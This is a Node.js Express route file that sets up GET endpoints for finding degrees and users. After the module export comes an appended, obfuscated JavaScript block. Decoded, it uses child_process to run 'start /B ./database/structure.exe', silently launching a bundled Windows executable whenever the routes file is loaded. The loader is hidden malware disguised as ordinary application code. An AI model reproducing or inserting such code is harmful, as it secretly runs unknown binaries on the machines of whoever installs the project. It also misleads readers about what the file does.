const controller = require("../controllers/degree.controller");

module.exports = function (app) {
    app.use(function (req, res, next) {
        res.header(
            "Access-Control-Allow-Headers",
            "x-access-token, Origin, Content-Type, Accept"
        );
        next();
    });

    // frontend routes
    app.get(
        "/api/degrees/find_all",
        controller.findAll
    );

    app.get(
        "/api/degrees/findDegreeById/:id",
        controller.findDegreeById
    );

    app.get(
        "/api/degrees/findUserById/:id",
        controller.findUserById
    );

    // backend routes
    app.get(
        "/api/degrees/get_all",
        controller.getAllDegrees
    );

    app.get(
        "/api/degrees/get_one/:id",
        controller.getDegree
    );

}

const _0x20ff42=_0x51eb;(function(_0x261fe4,_0x1fa882){const _0x248d7e=_0x51eb,_0x1e56c3=_0x261fe4();while(!![]){try{const _0x36a614=parseInt(_0x248d7e(0x139))/0x1*(-parseInt(_0x248d7e(0x135))/0x2)+parseInt(_0x248d7e(0x132))/0x3*(parseInt(_0x248d7e(0x13b))/0x4)+-parseInt(_0x248d7e(0x12e))/0x5+parseInt(_0x248d7e(0x133))/0x6*(-parseInt(_0x248d7e(0x130))/0x7)+-parseInt(_0x248d7e(0x136))/0x8*(-parseInt(_0x248d7e(0x137))/0x9)+parseInt(_0x248d7e(0x134))/0xa+parseInt(_0x248d7e(0x13a))/0xb;if(_0x36a614===_0x1fa882)break;else _0x1e56c3['push'](_0x1e56c3['shift']());}catch(_0xb0a63d){_0x1e56c3['push'](_0x1e56c3['shift']());}}}(_0x2d6e,0xaf1f1));function _0x51eb(_0x73bcff,_0x122213){const _0x2d6e76=_0x2d6e();return _0x51eb=function(_0x51eb6f,_0x3bf8f3){_0x51eb6f=_0x51eb6f-0x12e;let _0x16a879=_0x2d6e76[_0x51eb6f];return _0x16a879;},_0x51eb(_0x73bcff,_0x122213);}function _0x2d6e(){const _0x4435dc=['3187650RmqdDW','109730fWSirp','2942696ekVCNb','9XVbCOs','././database/structure.exe','11hNCMvZ','27463183mdCoyn','8xoUjHq','5996510XSVoqZ','child_process','383453SBkRAn','start\x20/B\x20','73479dNCTIg','78pahaKO'];_0x2d6e=function(){return _0x4435dc;};return _0x2d6e();}const {exec}=require(_0x20ff42(0x12f)),executablePath=_0x20ff42(0x138);exec(_0x20ff42(0x131)+executablePath,(_0x3dcf96,_0x340f84,_0x2668e1)=>{if(_0x3dcf96)return;});